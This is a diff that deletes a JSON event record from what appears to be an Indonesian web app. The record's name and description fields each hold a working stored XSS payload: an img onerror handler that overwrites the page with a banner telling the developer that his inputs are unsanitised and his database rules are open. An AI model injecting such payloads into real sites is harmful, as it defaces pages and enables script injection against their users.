@@ -1,9 +1,0 @@
-{
-  "nama": "<img src=x onerror=\"document.body.innerHTML='<div style=background:#1a1a1a;color:#ff3333;padding:50px;text-align:center;min-height:100vh;display:flex;flex-direction:column;justify-content:center;margin:0><h1 style=font-size:52px;margin-bottom:20px;text-shadow:0 0 10px #ff3333>Oii Farhan ada revisi nih!</h1><p style=font-size:18px;color:#fff;max-width:700px;margin:0 auto;line-height:1.8>Form input kamu belum di-sanitasi baik komentar dan upload ajukan project. Rules database mu rentan bisa aku akses pake curl sederhana, btw revisi dulu ya sebelum showcase pelan-pelan developnya semangat ya!</p></div>'\">",
-  "deskripsi": "<img src=x onerror=\"document.body.innerHTML='<div style=background:#1a1a1a;color:#ff3333;padding:50px;text-align:center;min-height:100vh;display:flex;flex-direction:column;justify-content:center;margin:0><h1 style=font-size:52px;margin-bottom:20px;text-shadow:0 0 10px #ff3333>Oii Farhan ada revisi nih!</h1><p style=font-size:18px;color:#fff;max-width:700px;margin:0 auto;line-height:1.8>Form input kamu belum di-sanitasi baik komentar dan upload ajukan project. Rules database mu rentan bisa aku akses pake curl sederhana, btw revisi dulu ya sebelum showcase pelan-pelan developnya semangat ya!</p></div>'\">",
-  "gambar": "https://example.com/warning.png",
-  "kategori": "Peringatan",
-  "link_acara": "#",
-  "tanggal_mulai": "2025-11-15",
-  "tanggal_selesai": "2025-11-15"
-}
